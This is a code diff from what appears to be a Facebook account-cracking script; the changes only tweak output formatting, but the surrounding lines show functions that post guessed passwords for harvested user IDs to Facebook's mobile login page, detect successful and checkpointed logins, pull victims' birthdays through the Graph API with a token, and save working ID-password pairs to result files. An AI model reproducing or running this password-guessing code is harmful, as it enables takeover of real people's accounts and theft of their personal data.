@@ -268,10 +268,10 @@ def public():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;92m*  ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -282,19 +282,19 @@ def public():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
+						print('\r  \033[0;93m*  ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
+						save.write('  *  '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m*  ' +uid+ '|' + pw + '       ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -360,10 +360,10 @@ def followers():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;92m*  ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -374,19 +374,19 @@ def followers():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
+						print('\r  \033[0;93m*  ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
+						save.write('  *  '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m*  ' +uid+ '|' + pw + '       ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -452,10 +452,10 @@ def reaction():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;92m*  ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -466,19 +466,19 @@ def reaction():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
+						print('\r  \033[0;93m*  ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
+						save.write('  *  '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '       ')
+					print('\r  \033[0;93m*  ' +uid+ '|' + pw + '       ')
 					cp.append(uid+'|'+pw)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -516,10 +516,10 @@ def manual():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
+					print('\r  \033[0;92m*  ' +uid+ '|' + asu + '       ')
 					ok.append(uid+'|'+asu)
 					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
@@ -529,19 +529,19 @@ def manual():
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
-						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
+						print('\r  \033[0;93m*  ' +uid+ '|' + asu + '|' + ttl)
 						cp.append(uid+'|'+asu+'|'+ttl)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
+						save.write('  *  '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '       ')
+					print('\r  \033[0;93m*  ' +uid+ '|' + asu + '       ')
 					cp.append(uid+'|'+asu)
 					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
-					save.write('  * --> '+str(uid)+'|'+str(asu)+'\n')
+					save.write('  *  '+str(uid)+'|'+str(asu)+'\n')
 					save.close()
 					break
 					continue
